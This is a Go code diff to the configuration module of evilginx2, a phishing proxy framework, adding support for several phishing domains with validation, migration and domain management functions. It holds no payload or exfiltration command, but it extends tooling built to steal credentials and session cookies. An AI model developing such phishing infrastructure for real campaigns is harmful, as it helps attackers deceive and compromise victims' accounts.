@@ -6,6 +6,7 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
+	"time"
 
 	"github.com/kgretzky/evilginx2/log"
 
@@ -113,15 +114,25 @@ type LureGenerationConfig struct {
 	Strategy string `mapstructure:"strategy" json:"strategy" yaml:"strategy"` // short, medium, long, realistic, hex, base64, mixed
 }
 
+type DomainInfo struct {
+	Domain      string `json:"domain" yaml:"domain"`
+	IsPrimary   bool   `json:"is_primary" yaml:"is_primary"`
+	Enabled     bool   `json:"enabled" yaml:"enabled"`
+	AddedAt     string `json:"added_at,omitempty" yaml:"added_at,omitempty"`
+	Description string `json:"description,omitempty" yaml:"description,omitempty"`
+}
+
 type GeneralConfig struct {
-	Domain       string `mapstructure:"domain" json:"domain" yaml:"domain"`
-	OldIpv4      string `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
-	ExternalIpv4 string `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
-	BindIpv4     string `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
-	UnauthUrl    string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
-	HttpsPort    int    `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
-	DnsPort      int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
-	Autocert     bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
+	Domain       string       `mapstructure:"domain" json:"domain" yaml:"domain"` // Legacy: kept for backward compatibility
+	Domains      []DomainInfo `mapstructure:"domains" json:"domains" yaml:"domains"` // New: multiple domains support
+	PrimaryDomain string      `mapstructure:"primary_domain" json:"primary_domain" yaml:"primary_domain"` // Current primary domain
+	OldIpv4      string       `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
+	ExternalIpv4 string       `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
+	BindIpv4     string       `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
+	UnauthUrl    string       `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
+	HttpsPort    int          `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
+	DnsPort      int          `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
+	Autocert     bool         `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
 }
 
 type Config struct {
@@ -238,6 +249,22 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 		c.cfg.Set("general.autocert", true)
 		c.general.Autocert = true
 	}
+	
+	// Migrate legacy single domain to multi-domain structure
+	if len(c.general.Domains) == 0 && c.general.Domain != "" {
+		c.general.Domains = []DomainInfo{
+			{
+				Domain:    c.general.Domain,
+				IsPrimary: true,
+				Enabled:   true,
+				AddedAt:   time.Now().Format(time.RFC3339),
+			},
+		}
+		c.general.PrimaryDomain = c.general.Domain
+		c.cfg.Set(CFG_GENERAL, c.general)
+		c.cfg.WriteConfig()
+		log.Info("migrated legacy domain configuration to multi-domain support")
+	}
 
 	c.cfg.UnmarshalKey(CFG_BLACKLIST, &c.blacklistConfig)
 
@@ -329,8 +356,9 @@ func (c *Config) SavePhishlets() {
 }
 
 func (c *Config) SetSiteHostname(site string, hostname string) bool {
-	if c.general.Domain == "" {
-		log.Error("you need to set server top-level domain, first. type: server your-domain.com")
+	// Check if any domain is configured
+	if len(c.general.Domains) == 0 && c.general.Domain == "" {
+		log.Error("you need to set server top-level domain, first. type: config domain <your-domain.com>")
 		return false
 	}
 	pl, err := c.GetPhishlet(site)
@@ -342,9 +370,39 @@ func (c *Config) SetSiteHostname(site string, hostname string) bool {
 		log.Error("phishlet is a template - can't set hostname")
 		return false
 	}
-	if hostname != "" && hostname != c.general.Domain && !strings.HasSuffix(hostname, "."+c.general.Domain) {
-		log.Error("phishlet hostname must end with '%s'", c.general.Domain)
-		return false
+	
+	// Validate hostname against configured domains
+	if hostname != "" {
+		valid := false
+		// Check against all enabled domains
+		for _, d := range c.general.Domains {
+			if d.Enabled {
+				if hostname == d.Domain || strings.HasSuffix(hostname, "."+d.Domain) {
+					valid = true
+					break
+				}
+			}
+		}
+		// Backward compatibility: check legacy domain
+		if !valid && c.general.Domain != "" {
+			if hostname == c.general.Domain || strings.HasSuffix(hostname, "."+c.general.Domain) {
+				valid = true
+			}
+		}
+		
+		if !valid {
+			domainsList := []string{}
+			for _, d := range c.general.Domains {
+				if d.Enabled {
+					domainsList = append(domainsList, d.Domain)
+				}
+			}
+			if c.general.Domain != "" {
+				domainsList = append(domainsList, c.general.Domain)
+			}
+			log.Error("phishlet hostname must end with one of the configured domains: %v", domainsList)
+			return false
+		}
 	}
 	log.Info("phishlet '%s' hostname set to: %s", site, hostname)
 	c.PhishletConfig(site).Hostname = hostname
@@ -376,10 +434,214 @@ func (c *Config) SetSiteUnauthUrl(site string, _url string) bool {
 }
 
 func (c *Config) SetBaseDomain(domain string) {
-	c.general.Domain = domain
+	// Legacy support: if domains list is empty, initialize it with the single domain
+	if len(c.general.Domains) == 0 {
+		c.general.Domains = []DomainInfo{
+			{
+				Domain:    domain,
+				IsPrimary: true,
+				Enabled:   true,
+				AddedAt:   time.Now().Format(time.RFC3339),
+			},
+		}
+		c.general.PrimaryDomain = domain
+	} else {
+		// Update primary domain
+		c.SetPrimaryDomain(domain)
+	}
+	c.general.Domain = domain // Keep for backward compatibility
 	c.cfg.Set(CFG_GENERAL, c.general)
 	log.Info("server domain set to: %s", domain)
 	c.cfg.WriteConfig()
+}
+
+// AddDomain adds a new domain to the configuration
+func (c *Config) AddDomain(domain string, description string) error {
+	// Validate domain format
+	domain = strings.ToLower(strings.TrimSpace(domain))
+	if domain == "" {
+		return fmt.Errorf("domain cannot be empty")
+	}
+	
+	// Check if domain already exists
+	for _, d := range c.general.Domains {
+		if d.Domain == domain {
+			return fmt.Errorf("domain %s already exists", domain)
+		}
+	}
+	
+	// Add new domain
+	newDomain := DomainInfo{
+		Domain:      domain,
+		IsPrimary:   false,
+		Enabled:    true,
+		AddedAt:     time.Now().Format(time.RFC3339),
+		Description: description,
+	}
+	
+	c.general.Domains = append(c.general.Domains, newDomain)
+	
+	// If this is the first domain, make it primary
+	if len(c.general.Domains) == 1 {
+		c.general.Domains[0].IsPrimary = true
+		c.general.PrimaryDomain = domain
+		c.general.Domain = domain // Backward compatibility
+	}
+	
+	c.cfg.Set(CFG_GENERAL, c.general)
+	log.Info("domain added: %s", domain)
+	c.cfg.WriteConfig()
+	return nil
+}
+
+// RemoveDomain removes a domain from the configuration
+func (c *Config) RemoveDomain(domain string) error {
+	domain = strings.ToLower(strings.TrimSpace(domain))
+	
+	// Cannot remove if it's the only domain
+	if len(c.general.Domains) <= 1 {
+		return fmt.Errorf("cannot remove the last domain")
+	}
+	
+	// Find and remove domain
+	found := false
+	newDomains := []DomainInfo{}
+	wasPrimary := false
+	
+	for _, d := range c.general.Domains {
+		if d.Domain == domain {
+			found = true
+			wasPrimary = d.IsPrimary
+			continue // Skip this domain
+		}
+		newDomains = append(newDomains, d)
+	}
+	
+	if !found {
+		return fmt.Errorf("domain %s not found", domain)
+	}
+	
+	c.general.Domains = newDomains
+	
+	// If removed domain was primary, make first enabled domain primary
+	if wasPrimary {
+		if len(c.general.Domains) > 0 {
+			c.general.Domains[0].IsPrimary = true
+			c.general.PrimaryDomain = c.general.Domains[0].Domain
+			c.general.Domain = c.general.PrimaryDomain // Backward compatibility
+		}
+	}
+	
+	c.cfg.Set(CFG_GENERAL, c.general)
+	log.Info("domain removed: %s", domain)
+	c.cfg.WriteConfig()
+	return nil
+}
+
+// SetPrimaryDomain sets the primary domain
+func (c *Config) SetPrimaryDomain(domain string) error {
+	domain = strings.ToLower(strings.TrimSpace(domain))
+	
+	// Find domain and set as primary
+	found := false
+	for i := range c.general.Domains {
+		if c.general.Domains[i].Domain == domain {
+			// Unset previous primary
+			for j := range c.general.Domains {
+				c.general.Domains[j].IsPrimary = false
+			}
+			// Set new primary
+			c.general.Domains[i].IsPrimary = true
+			c.general.PrimaryDomain = domain
+			c.general.Domain = domain // Backward compatibility
+			found = true
+			break
+		}
+	}
+	
+	if !found {
+		return fmt.Errorf("domain %s not found", domain)
+	}
+	
+	c.cfg.Set(CFG_GENERAL, c.general)
+	log.Info("primary domain set to: %s", domain)
+	c.cfg.WriteConfig()
+	return nil
+}
+
+// EnableDomain enables or disables a domain
+func (c *Config) EnableDomain(domain string, enabled bool) error {
+	domain = strings.ToLower(strings.TrimSpace(domain))
+	
+	found := false
+	for i := range c.general.Domains {
+		if c.general.Domains[i].Domain == domain {
+			c.general.Domains[i].Enabled = enabled
+			found = true
+			break
+		}
+	}
+	
+	if !found {
+		return fmt.Errorf("domain %s not found", domain)
+	}
+	
+	c.cfg.Set(CFG_GENERAL, c.general)
+	if enabled {
+		log.Info("domain enabled: %s", domain)
+	} else {
+		log.Info("domain disabled: %s", domain)
+	}
+	c.cfg.WriteConfig()
+	return nil
+}
+
+// GetDomains returns all configured domains
+func (c *Config) GetDomains() []DomainInfo {
+	return c.general.Domains
+}
+
+// GetPrimaryDomain returns the primary domain
+func (c *Config) GetPrimaryDomain() string {
+	if c.general.PrimaryDomain != "" {
+		return c.general.PrimaryDomain
+	}
+	// Fallback to legacy domain
+	if c.general.Domain != "" {
+		return c.general.Domain
+	}
+	// Fallback to first enabled domain
+	for _, d := range c.general.Domains {
+		if d.Enabled {
+			return d.Domain
+		}
+	}
+	return ""
+}
+
+// IsDomainValid checks if a domain is in the configured domains list
+func (c *Config) IsDomainValid(domain string) bool {
+	domain = strings.ToLower(strings.TrimSpace(domain))
+	
+	// Check exact match
+	for _, d := range c.general.Domains {
+		if d.Domain == domain && d.Enabled {
+			return true
+		}
+		// Check if hostname ends with this domain
+		if strings.HasSuffix(domain, "."+d.Domain) && d.Enabled {
+			return true
+		}
+	}
+	
+	// Backward compatibility: check legacy domain
+	if c.general.Domain != "" {
+		if domain == c.general.Domain || strings.HasSuffix(domain, "."+c.general.Domain) {
+			return true
+		}
+	}
+	
+	return false
 }
 
 func (c *Config) SetServerIP(ip_addr string) {
@@ -963,6 +1225,11 @@ func (c *Config) GetSiteUnauthUrl(site string) (string, bool) {
 }
 
 func (c *Config) GetBaseDomain() string {
+	// Return primary domain if available
+	if c.general.PrimaryDomain != "" {
+		return c.general.PrimaryDomain
+	}
+	// Fallback to legacy domain
 	return c.general.Domain
 }
 
